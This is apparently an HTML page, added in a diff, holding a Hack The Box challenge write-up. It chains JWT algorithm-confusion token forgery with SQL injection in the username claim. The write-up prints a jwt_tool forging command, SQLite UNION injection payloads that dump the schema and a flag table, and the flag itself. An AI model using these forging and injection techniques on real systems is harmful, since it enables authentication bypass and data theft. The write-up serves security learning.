@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Under Construction Challenge HTB - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Under Construction Challenge HTB</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1678484888323"
+                  >2023-03-10 16:48</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678501475648"
+                  >2023-03-10 21:24</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We are able to download the files for this challange, and examine the back end of the website that is hosted on this machine. We download the files and see that this challenge requires us to hack the JWT. The token call an SQLite database to verify whether a user exists, and also we can see how the tokens are generated:<br />
+<img src="/_resources/f5efe70db5aa4d24bb1d5de4caa14575.png" /></p>
+<p>SQLite dbhelper.json<br />
+<img src="/_resources/579920a1a3d84d66837547d9fb350846.png" /></p>
+<p>The live site is simple:<br />
+<a title="http://138.68.178.152:30596/auth" href="http://138.68.178.152:30596/auth">http://138.68.178.152:30596/auth</a><br />
+<img src="/_resources/05336fee3cb3423cb9dae19ccd041921.png" /></p>
+<p>We have the option to register, which will gives us a JWT<br />
+We create an account banana:banana<br />
+<img src="/_resources/b77ec300711e427c9f1319e713344f42.png" /><br />
+We login:<br />
+<img src="/_resources/00b699f64b83488e85b4e4ab89b95bc3.png" /></p>
+<p>We visit <a title="https://jwt.io/" href="https://jwt.io/">https://jwt.io/</a> and see that the JWT gives us a public key:<br />
+<img src="/_resources/d7a46dcc543e457e9283a1ac41710359.png" /></p>
+<p>There is a vulnerability with JWT that uses the private key to generate a public key for verification. We can change the algorithm from SHA256 to HS256, and the application will be default to using the HS algorithm instead of the private key.<br />
+<a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235</a><br />
+We can use the following python script to forge a new token:<br />
+<a title="https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20" href="https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20">https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20</a></p>
+<p>In addition, the DBHelper.js file has a SQL injection vulnerability since the $username variable is called directly into the function:<br />
+<img src="/_resources/2a8a046e30b94490918391bfe00777a2.png" /></p>
+<p>We can try to use the following tool to inject a value into the username field of the JWT token:<br />
+<a title="https://github.com/ticarpi/jwt_tool" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
+<p>First we copy the public key from the token into a file locally. We can get the key in clean output by running jwt_tool.py with the token as a paramater:<br />
+<img src="/_resources/51f477b0d9394803ae7404765277e064.png" /></p>
+<p>We can use the -X for exploit flag with k flag since we know that this server is vulnerable to key confusion and the -pk flag since we have the public key saved.</p>
+<p>python3 jwt_tool.py $(cat ../token) -I -pc username -pv "banana' and 1=1-- -" -X k -pk ../duplicate.key<br />
+<img src="/_resources/c9e74c121e234a238fe73819d5e2481e.png" /><br />
+We add a payload into the username:<br />
+banana ' and 1=1-- -</p>
+<p>And there are no errors, which means our injection works.<br />
+<img src="/_resources/287517f7ea0641ea9dbfad4b06a9d9bd.png" /><br />
+Let's try generating a payload that gives us some results.</p>
+<p>We try some union select queries:<br />
+' and 1=0 union select 111,sqlite_version(),333;--</p>
+<p><img src="/_resources/5aff6aee718c453db7dd80546eaf83c3.png" /></p>
+<p>We have injection.<br />
+We can dump the database with the following injection:<br />
+banana' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--<br />
+<img src="/_resources/15505b16d5b34aa383b7c787e7013c32.png" /></p>
+<p>We can get the value by entering this value:</p>
+<p>banana' AND 1=0 UNION SELECT 1,(SELECT group_concat(top_secret_flaag) FROM flag_storage),3;--</p>
+<p><img src="/_resources/f6199b6ddae74cdaaf2463bb73a64a38.png" /><br />
+HTB{d0n7_3xp053_y0ur_publ1ck3y}</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
